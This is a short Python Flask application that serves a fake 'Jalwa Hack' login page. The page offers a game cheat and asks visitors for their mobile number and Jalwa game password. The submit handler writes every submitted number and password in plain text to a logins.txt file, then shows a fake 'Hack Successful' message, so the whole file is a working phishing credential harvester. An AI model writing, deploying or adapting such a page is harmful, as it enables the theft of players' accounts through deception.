from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head>
        <title>Jalwa Hack Login 🔥</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #39ff14;
            }
            .container {
                background: rgba(0, 0, 0, 0.5);
                padding: 30px;
                border-radius: 20px;
                box-shadow: 0 0 20px #00fff7, 0 0 60px #00fff7;
                width: 90%;
                max-width: 400px;
                text-align: center;
            }
            h1 {
                color: #00fff7;
                text-shadow: 0 0 5px #00fff7, 0 0 10px #00fff7, 0 0 20px #00fff7;
                margin-bottom: 20px;
                font-size: 28px;
            }
            p {
                color: #ffffff;
                font-size: 14px;
                margin-bottom: 20px;
            }
            input[type="text"], input[type="password"] {
                width: 90%;
                padding: 12px;
                margin: 10px 0;
                background: rgba(255, 255, 255, 0.1);
                color: #00fff7;
                border: 1px solid #00fff7;
                border-radius: 10px;
                font-size: 16px;
                outline: none;
            }
            input::placeholder {
                color: #00fff7;
                opacity: 0.6;
            }
            input[type="submit"] {
                width: 95%;
                padding: 12px;
                font-size: 18px;
                color: white;
                background: linear-gradient(45deg, #00fff7, #ff00ff);
                border: none;
                border-radius: 10px;
                cursor: pointer;
                transition: 0.3s;
                box-shadow: 0 0 10px #00fff7, 0 0 20px #ff00ff;
            }
            input[type="submit"]:hover {
                background: linear-gradient(45deg, #ff00ff, #00fff7);
                box-shadow: 0 0 20px #ff00ff, 0 0 30px #00fff7;
            }
            .extra-text {
                color: #00fff7;
                font-size: 14px;
                margin-top: 10px;
                text-shadow: 0 0 5px #00fff7;
            }
        </style>
        <script>
            function validate() {
                const number = document.getElementById("number").value;
                const pass = document.getElementById("password").value;
                const button = document.getElementById("submitBtn");
                
                if (/^\\d{10}$/.test(number) && pass.trim().length > 0) {
                    button.disabled = false;
                } else {
                    button.disabled = true;
                }
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>JALWA LOGIN</h1>
            <p>Welcome to Rb premium Hack.<br>Sign in to continue. Activate Hack 🤖👾</p>
            <form action="/submit" method="post">
                <input type="text" id="number" name="number" placeholder="🆔 Enter Mobile Number" onkeyup="validate()"><br>
                <input type="password" id="password" name="password" placeholder="🔑 Enter Password" onkeyup="validate()"><br>
                <input type="submit" id="submitBtn" value="Sign In" disabled>
            </form>
            <div class="extra-text">Jalwa game ID password</div>
        </div>
    </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    number = request.form.get('number')
    password = request.form.get('password')
    with open("logins.txt", "a") as f:
        f.write(f"Number: {number}, Password: {password}\n")
    return '''
    <html>
    <head>
        <title>Hack Activated</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
                color: #00fff7;
                text-align: center;
                font-family: monospace;
                padding-top: 100px;
            }
            h2 {
                color: #00fff7;
                text-shadow: 0 0 10px #00fff7, 0 0 20px #00fff7;
                font-size: 24px;
            }
            p {
                color: #ffffff;
                font-size: 18px;
                margin-top: 20px;
            }
            a {
                color: #00fff7;
                font-size: 20px;
                text-shadow: 0 0 5px #00fff7;
            }
        </style>
    </head>
    <body>
        <h2>✅ Hack Successful! Activated!!</h2>
        <p>Hack</p>
        <a href="/">Back to Hack</a>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run()
